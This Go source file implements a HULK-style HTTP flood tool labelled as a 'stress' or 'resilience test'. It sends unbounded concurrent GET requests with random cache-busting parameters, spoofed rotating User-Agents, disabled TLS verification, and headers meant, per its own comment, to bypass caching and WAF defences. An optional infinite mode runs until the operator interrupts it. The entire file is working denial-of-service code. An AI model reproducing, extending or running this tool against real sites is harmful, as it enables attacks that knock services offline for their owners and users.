package stress

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like a Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
}

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func ExecuteContinuousStress(targetURL string, concurrency int, durationSec int) {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}

	fmt.Printf("[!] ENGAGING TRUE HTTP-LAYER HULK ENGINE: %s (Concurrency: %d)\n", targetURL, concurrency)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// High-performance transport tuned for massive HTTP keep-alive concurrency
	tr := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        concurrency * 2,
		MaxIdleConnsPerHost: concurrency,
		IdleConnTimeout:     30 * time.Second,
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	taskStream := make(chan struct{}, concurrency)

	// Spawn persistent worker pool
	for i := 0; i < concurrency; i++ {
		go func() {
			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
			for range taskStream {
				// Generate unique cache-busting query string parameters like real HULK
				cacheBuster := fmt.Sprintf("?%s=%s", randomString(6), randomString(8))
				reqURL := targetURL + cacheBuster

				req, err := http.NewRequest("GET", reqURL, nil)
				if err != nil {
					continue
				}

				// Rotate headers to bypass caching and WAF defenses
				req.Header.Set("User-Agent", userAgents[rng.Intn(len(userAgents))])
				req.Header.Set("Cache-Control", "no-cache")
				req.Header.Set("Pragma", "no-cache")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

				resp, err := client.Do(req)
				if err == nil {
					resp.Body.Close()
				}
			}
		}()
	}

	// Task Feeder Routine
	go func() {
		for {
			taskStream <- struct{}{}
		}
	}()

	if durationSec > 0 {
		timer := time.NewTimer(time.Duration(durationSec) * time.Second)
		select {
		case <-timer.C:
			fmt.Println("\n[+] HTTP resilience test duration completed.")
		case <-sigChan:
			fmt.Println("\n[+] HTTP resilience test aborted by operator.")
		}
	} else {
		// Infinite duration mode (-d 0)
		<-sigChan
		fmt.Println("\n[+] Continuous HTTP stress loop terminated by operator.")
	}
}
